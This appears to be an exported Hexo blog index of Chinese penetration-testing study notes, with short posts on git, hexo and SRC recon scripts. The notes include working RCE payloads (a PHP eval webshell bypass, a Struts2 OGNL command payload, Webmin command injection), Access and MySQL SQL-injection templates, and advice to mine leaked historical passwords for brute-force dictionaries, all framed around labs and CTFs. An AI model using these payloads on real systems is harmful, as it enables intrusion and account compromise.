<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>31-35、渗透测试(xiaodi)</title>
    <url>/2021/08/10/31-35%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
    <content><![CDATA[<p>31、RCE代码命令执行&amp;Php&amp;Py&amp;Java</p>
<p>#RCE漏洞详细点：</p>
<ul>
<li>漏洞场景：代码会调用自身的脚本代码执行（代码执行漏洞），也会调用系统命令执行（系统执行漏洞）</li>
<li>代码执行<ul>
<li>和脚本语言有关：php/java/python/js</li>
</ul>
</li>
<li>命令执行<ul>
<li>和操作系统有关：windows/linux/mac</li>
</ul>
</li>
<li>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）</li>
<li>漏洞危害：直接权限丢失</li>
</ul>
<span id="more"></span>

<p>#漏洞函数：</p>
<ul>
<li>1.PHP：<ul>
<li>eval()：把字符串当作代码执行</li>
<li>assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等</li>
<li>system、shell_exec、popen、passthru、proc_open等</li>
</ul>
</li>
<li>2.Python：<ul>
<li>eval exec subprocess os.system commands </li>
</ul>
</li>
<li>3.Java：<ul>
<li>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，</li>
<li>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</li>
</ul>
</li>
</ul>
<p>#案例1-各种语言类型-代码执行&amp;命令执行</p>
<ul>
<li>PHP,Javaweb,Python</li>
</ul>
<p>#案例2-未知漏洞利用-功能点&amp;代码块&amp;黑白盒</p>
<ul>
<li><p>1.功能点-[ACTF2020 新生赛]Exec-黑盒</p>
<ul>
<li><a href="https://blog.csdn.net/liucy007/article/details/90209277">https://blog.csdn.net/liucy007/article/details/90209277</a></li>
</ul>
</li>
<li><p>2.代码块-[极客大挑战 2019]RCE ME-白盒</p>
<ul>
<li>```php<br>#CTF 绕过正则表达式过滤#此处是分析代码，根据代码的过滤规则，构造我们的payloadphp -r “echo urlencode(<del>‘phpinfo’);”?code=(</del>%8F%97%8F%96%91%99%90)();<?php error_reporting(0);$a='assert';$b=urlencode(~$a);echo $b;echo "<br>";$c='(eval($_POST[xd]))';$d=urlencode(~$c);echo $d;?>?code=(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%9B%A2%D6%D6);<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-已知漏洞利用-Struts2&amp;Webmin&amp;Fastjson</span><br><span class="line"></span><br><span class="line">- 核心思想：直接根据网上的文章进行复现即可</span><br><span class="line"></span><br><span class="line">- 难点：网上的复现，仅仅展示了rce的存在，但是它复现中的命令执行无关痛痒，比如 ls 命令</span><br><span class="line"></span><br><span class="line">  - 既然可以命令执行，我们完全可以将ls命令换成其他命令，比如 通过echo命令写入一句话到一个php文件，然后连接即可</span><br><span class="line"></span><br><span class="line">- [GitHub - zhzyker/vulmap: Vulmap 是一款 web 漏洞扫描和验证工具, 可对 webapps 进行漏洞扫描, 并且具备漏洞验证功能](https://github.com/zhzyker/vulmap)</span><br><span class="line"></span><br><span class="line">- cve漏洞合集：https://github.com/nomi-sec/PoC-in-GitHub/</span><br><span class="line"></span><br><span class="line">- Struts2&amp;Webmin&amp;Fastjson</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    %23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat key.txtuser=root&amp;pam=1&amp;expired=2&amp;old=123456;ls&amp;new1=11&amp;new2=11对比st2代码命令执行-javaweb代码段学习掌握漏洞详情及漏洞利用过程利用</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>#案例4-RCE执行拓展-后门工具控制&amp;功能绕过原理</p>
<ul>
<li>菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉&amp;大马等原理及绕过解析<ul>
<li>原理：我们插入一句话后，有个密码，而菜刀这些webshell工具为什么能够查看目录或者进行其他的一些操作，本质就是通过这个密码，来传递一些命令执行的数据，首先这些工具会将一些组合的命令，通过各种编码，加密，然后通过密码（也可以说是变量）传到一句话木马里执行</li>
</ul>
</li>
</ul>
<p>发现一处命令执行的页面，但是只能执行特定的命令咋办？比如只能执行ping命令</p>
<ul>
<li>可以通过百度搜索“多条命令执行”，里面会有多条命令执行的一些连接符，这里推荐适用分号（；），分号代表着无论分号前面的语句是否执行成功，后面的语句都会执行，所以我们可以在ping命令后面加上分号，然后再拼接其他的命令，即可命令执行</li>
</ul>
<p>怎么发现rce？</p>
<ul>
<li>黑盒<ul>
<li>从功能点发现，比如某个页面就是执行ping命令的界面，那么很明显，这就是命令执行</li>
<li>从url上的关键字出发，有的url里有关键字，eval，system()等关键字，那么这里也有可能存在rce</li>
</ul>
</li>
<li>白盒<ul>
<li>代码审计</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>9-12、渗透测试学习笔记(xiaodi)</title>
    <url>/2021/08/10/9-12%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-xiaodi/</url>
    <content><![CDATA[<p>9、加密编码进制WEB&amp;系统&amp;代码</p>
<p>目的：看到一串密文，能识别它是什么加密，并且将其解密</p>
<p>常用场景：</p>
<ul>
<li>url里的参数被加密了，我们注入的时候也必须将payload进行进行加密才能进行注入<ul>
<li>墨者靶场地址：<a href="https://www.mozhe.cn/bug/detail/SjRRVFpOQWlLWDBJd3hzNGY5cFBiQT09bW96aGUmozhe">SQL注入漏洞测试(参数加密)_数据库安全_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a><span id="more"></span></li>
</ul>
</li>
<li>对一个网站进行请求的时候，有的一些敏感参数进行加密了，我们必须解密才能懂每个参数的意思</li>
<li>网站的账户和密码一般都被加密了，所以就算我们通过手段获取到了密码，也没用，必须要将密码解密才有用<ul>
<li>有的密码加密还带了salt（盐），所以想解密这种md5，也必须要获取到salt是多少才行，不过一般数据库里也会存储salt，可以获取到去解密网站进行解密</li>
</ul>
</li>
<li>代码审计：有的代码被解密了，所以必须将其解密了才能代码审计</li>
<li>windows账户密码解密：NTLM、Hash、SHA</li>
</ul>
<p>解密网站大全：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结_Greedy Hat的博客-CSDN博客</a></li>
</ul>
<p>密文加密特征：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析（建议收藏） (qq.com)</a></li>
</ul>
<p>常用工具：</p>
<ul>
<li>迪哥发的里面的：超级加解密转换工具</li>
</ul>
<h2 id="10、WEB-amp-系统-amp-APP-amp-服务漏洞权限认知"><a href="#10、WEB-amp-系统-amp-APP-amp-服务漏洞权限认知" class="headerlink" title="10、WEB&amp;系统&amp;APP&amp;服务漏洞权限认知"></a>10、WEB&amp;系统&amp;APP&amp;服务漏洞权限认知</h2><p>不同的脚本语言适用的漏洞也不同</p>
<ul>
<li>例如sql漏洞在php里比较多，在java里就很少了（php的一般是php格式，java的一般是jsp格式的）</li>
</ul>
<p>不同的中间件也适用于不同的漏洞</p>
<ul>
<li>比如Glassfish就只在java里有</li>
</ul>
<p>权限(从低到高)</p>
<ul>
<li>后台</li>
<li>数据库权限</li>
<li>web权限</li>
<li>系统权限</li>
<li>内网权限</li>
</ul>
<h2 id="11-、信息收集实战"><a href="#11-、信息收集实战" class="headerlink" title="11 、信息收集实战"></a>11 、信息收集实战</h2><p>基本流程：</p>
<ul>
<li>判断有无cdn或者waf<ul>
<li>违法类网站或者小网站一般无cdn</li>
</ul>
</li>
<li>cms识别、中间件识别<ul>
<li>cms识别可以在搜索引擎搜索该网站的特有的url关键字</li>
<li>看有无历史漏洞</li>
</ul>
</li>
<li>whois和备案查询，网站页面的联系方式，比如qq，根据页面公司或者标志前往搜索引擎搜索关键字，查找它的其他网站</li>
<li>根据上一步获取的信息前往搜索引擎，或者fofa获取更多的资产</li>
<li>收集子域名</li>
<li>敏感文件扫描，有waf就放慢速度<ul>
<li>可对收集到的大量的子域名进行批量扫描</li>
</ul>
</li>
<li>查找登录的页面或者支付接口，然后根据获取的qq或者手机号去纸飞机查询历史密码，若历史密码不正确，则可以根据查询到的历史密码里的关键字制作成字典进行爆破</li>
</ul>
<h2 id="12-、SQL注入-amp-超级靶场-amp-函数-amp-可控变量"><a href="#12-、SQL注入-amp-超级靶场-amp-函数-amp-可控变量" class="headerlink" title="12 、SQL注入&amp;超级靶场&amp;函数&amp;可控变量"></a>12 、SQL注入&amp;超级靶场&amp;函数&amp;可控变量</h2><p>函数：决定可能存在什么漏洞，比如数据库查询函数，则可能存在SQL注入</p>
<p>可控变量：变量是否可控决定此处是否存在漏洞，如果变量被写死了，则不存在漏洞</p>
<p>检测是否存在sql注入：</p>
<p>本质：就是对一个参数比如id=1  后面随便加乱七八糟的字符，当然如果是字符型，一定要闭合单引号，否则乱加的数据都会当作字符串进行执行了只要页面和不加之前保持一致，那么就不存在注入，因为这代表加的字符没有带入查询，如果带入查询，我们乱加的字符一定会导致页面和不加之前不一致</p>
<ul>
<li>原始方式<ul>
<li>and 1=1 页面正常</li>
<li>and 1=2 页面错误</li>
<li>则表示存在注入</li>
</ul>
</li>
</ul>
<p>数据库查询代码样例分析</p>
<ul>
<li><pre><code class="php">&lt;?php
header(&quot;Content-Type: text/html; charset=utf-8&quot;);
//$s=&#39;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125;&#39;;
//var_dump(unserialize($s));
//var_dump(scandir(&quot;.&quot;));

$id=$_GET[&#39;id&#39;];
$idx=$_GET[&#39;x&#39;];
$idpage=$_GET[&#39;page&#39;];//接受参数名为id赋值给变量id
if(!is_integer($id))&#123;
    $conn=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);//连接数据库
    mysql_select_db(&#39;javaweb-bbs&#39;,$conn);//选择数据库名为javaweb-bss的数据库
    $sql=&quot;select * from sys_article where id = $id&quot;;//组合定义SQL语句
    echo $sql.&#39;&lt;hr&gt;&#39;;//输出变量sql
    $result=mysql_query($sql);//执行变量sql里的SQL语句
    if($row=mysql_fetch_array($result))&#123; //对执行的结果进行显示
        echo $row[&#39;title&#39;].&#39;&lt;hr&gt;&#39;;
        echo $row[&#39;content&#39;].&#39;&lt;hr&gt;&#39;;
    &#125;
else&#123;
    echo &quot;fuck&quot;;
&#125;
&#125;
</code></pre>
</li>
</ul>
<p>sql过滤：</p>
<ul>
<li>关键字过滤<ul>
<li>比如过滤union、update，and等</li>
</ul>
</li>
<li>类型过滤<ul>
<li>过滤数字类型</li>
<li>过滤字符类型</li>
</ul>
</li>
</ul>
<p>get注入时，url存在注入的条件：</p>
<ul>
<li>url里必须要有参数</li>
</ul>
<p>数据库结构</p>
<ul>
<li>mysql数据库<ul>
<li>数据库A = 网站A<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数据库B=网站B<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数据库C=网站C<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>union联合注入</p>
<ul>
<li><p>判断参数是什么类型</p>
<ul>
<li>如果是字符型，则需要闭合单引号(原始代码 ‘$id’)，并且查询语句后面还需要加上 –+来注释掉剩下的单引号</li>
<li>如果是数字型，则不需要</li>
</ul>
</li>
<li><p>查询长度：order by 3  </p>
<ul>
<li>如果实际长度超过3，就会报错，</li>
</ul>
</li>
<li><p>联合查询</p>
<ul>
<li>union select 1,2,3  <ul>
<li><a href="http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1%27union%20select%20%201,2,3--+">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1%27union%20select%20%201,2,3--+</a></li>
<li><img src="/source/images/image-20210729095857024.png" alt="image-20210729095857024"></li>
</ul>
</li>
<li>易错点：如果页面没有回显，需要将union前面的语句变成false，比如1改为-1</li>
</ul>
</li>
<li><p>开始查询</p>
<ul>
<li><p>在回显位置的参数处插入想查询的内容，比如database()</p>
<ul>
<li>127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1’union select  1,database(),user()–+)</li>
<li><img src="/source/images/image-20210729095938429.png" alt="image-20210729095938429"></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>多参数注入：http//:127.0.0.1/1.php?a=3&amp;id=16</p>
<ul>
<li><p>假设扫描出来参数a存在注入</p>
<ul>
<li><p>应该怎么手工？</p>
<ul>
<li>直接在参数a的值后面拼接sql语句，比如：http//:127.0.0.1/1.php?a=3 and 1=2&amp;id=16</li>
</ul>
</li>
<li><p>应该怎么用sqlmap？</p>
<ul>
<li>直接将存在注入的参数剪切下来拼接到最后面（这样不影响访问）：python3 sqlmap.py -u “http//:127.0.0.1/1.php?id=16&amp;a=3”     </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>sqli-labs靶场搭建</p>
<ul>
<li>下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li>
<li>解压：解压会提示重名，我们只需要打开压缩包，然后将里面的文件夹拖出来即可</li>
<li>修改连接配置文件：sqli-labs-master\sql-connections\db-creds.inc<ul>
<li>将密码修改为：$dbpass =’root’;</li>
</ul>
</li>
<li>浏览器访问：127.0.0.1/sqli-labs-master/    ,接着点击：Setup/reset Database for labs<ul>
<li>如果报错就代表上一步的配置文件没有修改到位</li>
<li>还有可能就是php的版本不对，应该是图片中的这个php-5.4.45+Apache<ul>
<li><img src="/source/images/image-20210729094139732.png" alt="image-20210729094139732"></li>
</ul>
</li>
<li>至此，靶场安装完成</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>github推送新项目</title>
    <url>/2021/08/09/github%E6%8E%A8%E9%80%81%E6%96%B0%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>应用场景：</p>
<pre><code>推送本地项目到github上
</code></pre>
<p>步骤：</p>
<pre><code>0、在github上新建一个仓库，取个名字，直接默认即可
1、本地新建一个文件夹，我这里新建github文件夹
2、右键---打开gitbash（需要提前安装git工具）
</code></pre>
<span id="more"></span>
<pre><code>3、输入以下命令
    git init   初始化仓库
    git add .     这个点 . 代表当前目录所有文件，表示把当前目录所有文件添加进去
    git commit -m &quot;ip反查公司+域名&quot;   设置提交的时候的备注
    git remote add origin https://github.com/lishang520/security-tools.git  添加远程仓库，这个仓库地址是我们新建的仓库的那个地址
    git push -u origin master   将本地文件推送到github上
4、以后每次推送只需要执行以下几个命令
    git add .    
    git commit -m &quot;ip反查公司+域名&quot;  
    git remote add origin https://github.com/lishang520/security-tools.git  
    git push -u origin master 
</code></pre>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo基础语法</title>
    <url>/2021/08/09/hexo%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>1、设置阅读全文</p>
<pre><code>只需要在文章插入字符串&#39;&lt;!--more--&gt;&#39; 即可
</code></pre>
<p>2、hexo clean 清楚缓存</p>
<p>3、hexo g 生成博客</p>
<p>4、hexo server 启动本地博客</p>
<p>5、配置步骤2、3、4自动化</p>
<pre><code>修改package.json 文件，将里面server的值改为：  hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server
</code></pre>
<p>6、hexo d 上传博客</p>
<p>6、hexo new “文件名”  新建文章</p>
<p>7、hexo new page link   在source目录下创建了link目录，并且创建了index.md文件</p>
<span id="more"></span>

]]></content>
      <categories>
        <category>hexo使用技巧</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ip反查公司+域名</title>
    <url>/2021/08/09/ip%E5%8F%8D%E6%9F%A5%E5%85%AC%E5%8F%B8-%E5%9F%9F%E5%90%8D/</url>
    <content><![CDATA[<p>应用场景：</p>
<pre><code>刷公益src的时候，ip类资产都是不收的，因为无法找到归属，而一个一个ip去查归属，太繁琐，
所以本工具就是通过纯真数据库反查ip的公司，提供过ip138反查域名，然后将这些数据写入excel中
</code></pre>
<p>工具需要的环境</p>
<pre><code>python3 
最新的纯真数据库()
</code></pre>
<span id="more"></span>
<p>安装：</p>
<pre><code>1、前往地址：https://github.com/WisdomFusion/qqwry.dat  查看最新版本的纯真数据库，我这里的是20210506版本的，如果它们更新了，记得替换qqwry目录下的qqwry.dat
2、准备目标ip：放在当前目录下的targets.txt 文件
    注意事项：这里的ip建议是已经被poc打中了的ip，这样效率比较高
3、准备代理ip，当我们查询次数多了，ip138会封ip，所以我们可以准备代理ip
    熊猫代理注册链接：http://www.xiongmaodaili.com?invitationCode=C34F143A-7D85-4A22-BE1D-A19E5972E816
4、购买高校代理就行了，在ip归属和域名批量查询.py 的53行进行替换
</code></pre>
<p>运行：直接运行脚本即可</p>
<p>结果处理的意见建议：</p>
<pre><code>1、重点关注 归属公司  和  域名
2、将归属公司 和域名  两列添加筛选
3、首先将域名全部筛选出  None
4、其次观察归属公司，将那种带有如下关键字眼的全部删掉
    节点、电信、移动、联通、城通、中心 等其他一看就属于中间商而非归属商的行全部删掉
5、接着取消归属公司和域名的筛选，下面的数据几乎都是符合条件的
    要么域名是none，但是又归属公司，所以能证明归属
    要么有预谋，归属公司有没有就无所谓了，因为有域名，打开域名一看，就知道对方的归属了
</code></pre>
<p>工具下载链接：<a href="https://github.com/lishang520/security-tools">https://github.com/lishang520/security-tools</a></p>
<p>对你有用的话，希望能给个星星</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>公益src</tag>
      </tags>
  </entry>
  <entry>
    <title>typora笔记里的图片迁移</title>
    <url>/2021/08/10/typora%E7%AC%94%E8%AE%B0%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>应用场景：</p>
<pre><code>之前用typora做的笔记，里面有图片，现在将笔记迁移到hexo上，
图片肯定也需要迁移的，这篇文章就是为了解决这个问题
</code></pre>
<p>方法步骤：</p>
<pre><code>修改配置：
    1、在source目录下新建目录：images
    2、修改typora的偏好设置--图像--选择复制到指定路径--输入以下路径
        ./../source/images/
    3、将5个复选框全部勾选上
    4、选择菜单栏---格式---图像---设置根目录--选择你blog下的source目录
</code></pre>
<span id="more"></span>
<pre><code>开始迁移：
    1、打开旧笔记md，点击笔记里的随便一张图片，找到图片的路径
    2、将该图片里的路径全部复制到我们刚才新建的images目录下
    3、使用命令新建文章：hexo new &quot;测试&quot;
    4、将我们带迁移的md笔记全选，然后粘贴到新笔记的md里
    5、在新笔记里ctrl+f  选择替换，将新笔记.md里的图片的绝对路径进行替换，替换成我们新建的images这个路径，注意是绝对路径哦
        例如：旧图片路径：C:\Users\painter\AppData\Roaming\Typora\typora-user-images\image-20210808105910264.png
            我们只需要将C:\Users\painter\AppData\Roaming\Typora\typora-user-images\   替换成我们的相对路径：   /source/images/     即可
    6、注意选择全部替换
</code></pre>
]]></content>
      <categories>
        <category>hexo使用技巧</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>自动添加协议头</title>
    <url>/2021/08/10/%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0%E5%8D%8F%E8%AE%AE%E5%A4%B4/</url>
    <content><![CDATA[<p>应用场景：</p>
<pre><code>通过fofa批量工具获取的url或ip好多都没有协议头，在后续的poc利用中，还需要调整它们的格式，很繁琐，
该工具可以批量给fofa、shodan等工具爬取的url批量添加协议头
</code></pre>
<p>支持场景：</p>
<pre><code>url和ip
</code></pre>
<p>利用方法：</p>
<pre><code>将目标url放在targets.txt中，然后运行脚本程序即可，待程序运行完毕，会在当前目录生成一个result.txt的文件
</code></pre>
<p>工具地址：<a href="https://github.com/lishang520/security-tools">https://github.com/lishang520/security-tools</a></p>
<span id="more"></span>



]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>13-15、渗透测试(xiaodi)</title>
    <url>/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
    <content><![CDATA[<p>13 、SQL注入&amp;Mysql&amp;Postsql&amp;Access</p>
<p>1、不同数据库类型差异讲解</p>
<ul>
<li>sql查询语句不同</li>
<li>架构和权限的划分也不同（数据库的用户是高权限用户还是低权限用户）</li>
</ul>
<p>2、SQL注入与数据库类型关系</p>
<p>3、Access&amp;Mysql&amp;PostgreSQL</p>
<p>4.实战中如何判断当前注入点数据库</p>
<span id="more"></span>


<ul>
<li>脚本语言组合<ul>
<li>php   mysql</li>
<li>asp   access</li>
</ul>
</li>
<li>端口扫描，namp</li>
</ul>
<p>sql注入-Fuzz字典使用说明</p>
<ul>
<li>适用场景：手工注入、手工+工具注入</li>
<li>工具和字典<ul>
<li><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
<li><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></li>
</ul>
</li>
</ul>
<p>Access联合&amp;偏移注入</p>
<ul>
<li><p>特点：小型的数据库，现在很少见了，一般搭配sap的脚本语言</p>
</li>
<li><p>Access数据库架构</p>
<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>mysql数据库架构</p>
<ul>
<li>数据库A = 网站A<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数据库B=网站B<ul>
<li>表名<ul>
<li>列名<ul>
<li>数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Access数据库和mysql数据库的区别</p>
<ul>
<li>根据架构不同，Access只有一个数据库，而mysql有多个数据库，所以Access第一步猜解表名就可以了，而mysql因为有多个数据库，所以第一步是猜解当前数据库的数据库名字</li>
<li>Access是暴力猜解，所以能否猜解出表名、列名取决于字典的丰富程度，所以经常会导致猜解不出表名、列名的情况，而mysql则不是这样，mysql有一个总的数据库，所有的东西都在里面，都有规律，所以不需要暴力猜解</li>
</ul>
</li>
<li><p>Access联合注入</p>
<ul>
<li><p>查字段数： order by 22 </p>
</li>
<li><p>开始猜解表名，在 order by 22 后面拼接  from admin    此时这里的admin是我们猜解的表名，如果admin不存在。则会报错</p>
<ul>
<li>技巧：这里可以使用burp。将admin设置为变量。然后组合字典进行猜解</li>
<li>127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</li>
</ul>
</li>
<li><p>开始猜解列名：如果表名猜解出来了的话</p>
<ul>
<li>```python<br>#猜解一个字段<br><a href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a>#猜解2个字段<br><a href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">- Access偏移注入：解决能暴力猜解出表名，但是猜不出列名的情况</span><br><span class="line"></span><br><span class="line">  - 要求：会套用模板即可</span><br><span class="line"></span><br><span class="line">  - 代码：</span><br><span class="line"></span><br><span class="line">    - ```python</span><br><span class="line">      偏移注入：解决表名获取到而列名获取不到情况</span><br><span class="line">      使用方法：</span><br><span class="line">      	1、首先可以观察到一共有22个字段，我们接着使用星号 *  代替22，然后访问该页面，若报错，接着继续往前删掉数字，22 -&gt; 1 一直往前删除，直到页面不报错</span><br><span class="line">          2、此处发现，删除到16的时候，页面正常，相当于 * 号占了6个位置</span><br><span class="line">          3、接着使用第三条语句开始二级偏移，* from (admin as a inner join admin as b on a.id = b.id)   ，并且接着继续往前删除6个数字，这里就是删到10，然后查看页面和源代码，看字段的值有没有爆出来，如果没有爆出来，就进行下一步三级偏移</span><br><span class="line">          4、同理，继续往前删除6个数字，组合语句 a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)   ，查看页面和源代码是否有我们需要的内容爆出</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line">      union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)</span><br><span class="line">      </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>SQL注入-Mysql高低版本联合注入</p>
<ul>
<li><p>常用查询函数</p>
<ul>
<li>database()      数据库名</li>
<li>version()      数据库版本</li>
<li>user()      数据库用户</li>
<li>@@version_compile_os  操作系统</li>
</ul>
</li>
<li><p>低版本： &lt;Mysql 5.0  </p>
<ul>
<li>特性：属于暴力猜解 ，不带有information_schema ，所以只能暴力猜解</li>
</ul>
</li>
<li><p>高版本</p>
<ul>
<li>特性：有规律的猜解，带有数据库名information_schema,其存储着所有的数据库的名字、表名、列名的信息</li>
<li>查询函数<ul>
<li>information_schema.tables  下的l列table_name 储存有所有的表名</li>
<li>information_schema.columns  下的列column_name 储存有所有的列名</li>
<li>information_schema..schemata 下的schema_name   储存有所有的数据库的名字</li>
<li>table_schema 数据库名<ul>
<li>易错点：一定要注意，是table_schema ，并不是schema_name</li>
</ul>
</li>
<li>table_name  表名</li>
<li>column_name 列名</li>
</ul>
</li>
<li>实例：墨者靶场：<a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">SQL手工注入漏洞测试(MySQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a><ul>
<li>判断参数是字符型还是数字型：<a href="http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1">http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1</a><ul>
<li>报错，所以不是字符型，那他是数字型</li>
<li><img src="/source/images/image-20210729122300887.png" alt="image-20210729122300887"></li>
</ul>
</li>
<li>查询长度：<a href="http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204">http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204</a><ul>
<li>结果为4</li>
</ul>
</li>
<li>联合查询：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4</a><ul>
<li>易错点：需要将union前面的语句置错，比如改成 -1</li>
<li><img src="/source/images/image-20210729122534689.png" alt="image-20210729122534689"></li>
</ul>
</li>
<li>开始在显示位2的位置sql注入查询数据库版本：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4</a><ul>
<li><img src="/source/images/image-20210729122706545.png" alt="image-20210729122706545"></li>
</ul>
</li>
<li>因为是版本大于或等于5.0，所以可以hi用information_schema数据库进行注入</li>
